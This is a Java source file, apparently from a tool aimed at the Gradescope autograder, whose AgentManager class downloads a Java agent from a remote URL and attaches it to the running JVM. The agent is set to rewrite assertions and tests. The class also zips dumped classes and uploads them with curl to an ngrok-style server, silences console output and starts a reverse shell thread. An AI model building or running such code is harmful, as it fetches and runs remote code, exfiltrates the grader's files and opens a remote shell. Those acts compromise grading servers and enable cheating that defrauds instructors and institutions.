package gradeskope;

import gradeskope.file.ZipFolder;
import gradeskope.http.CurlFileUploader;
import gradeskope.http.FileUploader;
import gradeskope.process.MagicManager;
import gradeskope.shell.ReverseShellRunnable;
import gradeskope.shell.RSHellTargetType;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class AgentManager {

  public static String AGENT_LOCAL_SRC =
      "/home/user/IdeaProjects/GradescopeInspector2/GradescopeAgent/build/libs/GradescopeAgent-1.1.jar";
  public static String TMP_DIR = "/tmp/javaroot/";

  public static String AGENT_JAR = "GradescopeAgent-1.1.jar";
  public static String AGENT_ARGS = "";
  private static Integer instantiationCount = 0;

  private String agentRemoteSrc;
  private String dumpDest;
  private String zipName;

  private boolean enableDump;
  private boolean enableAssertTransform;
  private boolean enableTestTransform;
  private boolean enableReverseShell;
  private RSHellTargetType reverseShellTarget;

  public static String TARGET_PROCESS_MATCH_STRING = null;

  private String reverseShellURL;


  // if targetProcessMatchString == null, program attaches agent to executing process
  // Otherwise it attaches to the first program that matches string
  public AgentManager(boolean enableDump,
                      boolean enableAssertTransform,
                      boolean enableTestTransform,
                      boolean silent,
                      boolean enableReverseShell,
                      RSHellTargetType reverseShellTarget,
                      String reverseShellURL,
                      String agentDownloadURL,
                      String dumpDest,
                      String zipName,
                      String targetProcessMatchString) {
    this.enableDump = enableDump;
    this.enableAssertTransform = enableAssertTransform;
    this.enableTestTransform = enableTestTransform;
    this.enableReverseShell = enableReverseShell;
    this.reverseShellTarget = reverseShellTarget;
    this.reverseShellURL = reverseShellURL;
    this.agentRemoteSrc = agentDownloadURL;
    this.dumpDest = dumpDest;
    this.zipName = zipName;
    TARGET_PROCESS_MATCH_STRING = targetProcessMatchString;


    if (enableDump) {
      AGENT_ARGS = AGENT_ARGS + "--enableDumpingTransform ";
    }

    if (enableAssertTransform) {
      AGENT_ARGS = AGENT_ARGS + "--enableAssertTransform ";
    }

    if (enableTestTransform) {
      AGENT_ARGS = AGENT_ARGS + "--enableTestTransform ";
    }

    if (silent) {
      System.setOut(new PrintStream(new NullOutputStream()));
      AGENT_ARGS = AGENT_ARGS + "--silent ";
    }

    if (enableReverseShell && reverseShellTarget == RSHellTargetType.AGENT_ATTACHED_PROCESS) {
      AGENT_ARGS += "--reverseShell " + reverseShellURL + " " + reverseShellURL;
    }
  }

  public AgentManager() {

  }

  public void run() {

    instantiationCount++;

    //      To only run this code once
    if (instantiationCount == 1) {

      if (enableReverseShell && reverseShellTarget == RSHellTargetType.CURRENT_PROCESS) {
        Thread thread = new Thread(new ReverseShellRunnable(reverseShellURL));
        thread.start();
      }

      // Temporary directory for download and class exporting
      if (MagicManager.isRemote()) {

        File downloadDir = new File(TMP_DIR);
        try {
          Files.createDirectories(downloadDir.toPath());

          if (Files.isWritable(downloadDir.toPath())) {
            // Download Java Agent and save to tmpdir
            URL website = null;
            website = new URL(agentRemoteSrc);
            ReadableByteChannel rbc = Channels.newChannel(website.openStream());
            FileOutputStream fos =
                new FileOutputStream(TMP_DIR + AGENT_JAR);
            fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
          }
        } catch (Exception e) {
          throw new RuntimeException(e);
        }
      }

      if (MagicManager.isRemote()) {

        MagicManager.attachAgentToVM(TMP_DIR + AGENT_JAR,
            AGENT_ARGS);
      } else {
        MagicManager.attachAgentToVM(AGENT_LOCAL_SRC, AGENT_ARGS);
      }

      if (enableDump) {
        ZipFolder zipFolder = new ZipFolder();
        File[] excludedFiles = {new File(TMP_DIR + zipName)};

        try {
          zipFolder.zipFolder(
              new File(TMP_DIR),
              new File(TMP_DIR + zipName),
              excludedFiles
          );
        } catch (Exception e) {
          throw new RuntimeException(e);
        }

        String[] headers = {"ngrok-skip-browser-warning: true"};
        FileUploader fileUploader = new CurlFileUploader(dumpDest, headers, new File(
            TMP_DIR + zipName));
        System.out.println("Curl Exit Code: " + fileUploader.getExitCode());

        // Delete zip after upload
        try {
          Files.deleteIfExists(Paths.get(TMP_DIR + zipName));
        } catch (IOException e) {
          e.printStackTrace();
        }
      }

      // Upload Zip Files to quick and dirty http upload server
    }
  }
}
